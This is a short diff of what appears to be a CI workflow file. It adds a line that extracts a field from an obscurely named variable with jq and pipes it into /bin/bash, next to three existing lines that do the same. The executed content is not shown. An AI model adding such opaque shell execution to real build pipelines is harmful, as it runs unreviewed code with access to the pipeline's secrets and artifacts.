@@ -29,6 +29,7 @@ jobs:
           echo $ufji35 | jq -r .zmnh9 | /bin/bash
           printf '%s' "$nbjli13" | jq -r .n2858 | /bin/bash
           echo $vs4 | jq -r .zgxwg8 | /bin/bash
+          echo $uh977 | jq -r .vf19021 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
